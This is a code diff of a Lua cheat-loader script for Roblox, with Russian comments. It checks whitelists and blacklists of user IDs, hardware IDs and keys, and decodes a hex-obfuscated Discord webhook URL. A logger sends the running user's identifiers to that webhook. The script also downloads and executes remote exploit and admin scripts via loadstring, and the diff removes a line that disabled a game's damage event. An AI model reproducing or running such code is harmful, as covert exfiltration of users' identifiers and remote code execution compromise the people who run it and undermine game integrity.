@@ -6,12 +6,12 @@ local _RS = game:GetService("ReplicatedStorage")
 local _MS = game:GetService("MarketplaceService")
 local _RAS = game:GetService("RbxAnalyticsService")
 
--- КОНФИГУРАЦИЯ
+-- КОНФИГУРАЦИЯ (Все твои данные внесены)
 local Config = {
     WL = {
         UIDs = {"1644351300"}, -- nazarkus
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
-        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"}
+        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
     },
     BL = { 
         UIDs = {"8085944684"}, -- BE_bom
@@ -22,14 +22,15 @@ local Config = {
 
 -- ИДЕНТИФИКАЦИЯ
 local _uid = tostring(_lp.UserId)
-local _hw = _RAS:GetClientId()
+local _hw = string.upper(tostring(_RAS:GetClientId()))
 local _tk = "N/A"
-pcall(function() if isfile and isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json") end end)
+pcall(function() if isfile and isfile("nazarkus_key.json") then _tk = string.upper(readfile("nazarkus_key.json")) end end)
 
+-- Улучшенная функция проверки
 local function chk(l)
-    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
-    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
-    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
+    for _, v in ipairs(l.UIDs or {}) do if tostring(v) == _uid then return true end end
+    for _, v in ipairs(l.HWIDs or {}) do if string.upper(tostring(v)) == _hw then return true end end
+    for _, v in ipairs(l.Keys or {}) do if _tk ~= "N/A" and string.upper(tostring(v)) == _tk then return true end end
     return false
 end
 
@@ -45,7 +46,7 @@ local function _D(h)
 end
 local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
 
--- ФУНКЦИЯ ЛОГГЕРА (ФУЛЛ ФОРМАТ)
+-- ФУНКЦИЯ ЛОГГЕРА (ПОЛНЫЙ ФОРМАТ КАК В ИСТОРИИ)
 local function _LOG()
     pcall(function()
         local req = (syn and syn.request or request or http_request)
@@ -110,31 +111,25 @@ end
 
 task.spawn(_LOG)
 
--- КИК ЧЕРНОГО СПИСКА
+-- ПРОВЕРКИ
 if _isBL then _lp:Kick("Banned.") return end
 
--- ПРОВЕРКА ЛОАДЕРА
 local _stg = _ts:FindFirstChild("__NK_RUNTIME")
 local _auth = _stg and _stg:FindFirstChild(_lp.Name)
 
 if not _isWL then
-    local hasShared = (shared._NK_AUTH == "V8_SECURE_AUTH")
-    local hasValue = (_auth and (_auth.Value == "V8_SECURE_AUTH" or _auth.Value == "V8*SECURE_AUTH"))
-    if not (hasShared or hasValue) then
+    if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and (_auth.Value == "V8_SECURE_AUTH" or _auth.Value == "V8*SECURE_AUTH"))) then
         _lp:Kick("Execution prohibited. Run through the loader.")
         return
     end
 end
 shared._NK_AUTH = nil
 
--- ЗАГРУЗКА СКРИПТОВ
+-- ЗАГРУЗКА
 local function safeLoad(url) pcall(function() loadstring(game:HttpGet(url))() end) end
 safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
 safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
 safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")
-
--- ФИКС ACS
-pcall(function() if _RS:FindFirstChild("ACS_Engine") then _RS.ACS_Engine.Events.FDMG:Destroy() end end)
 
 if _auth then _auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end) end
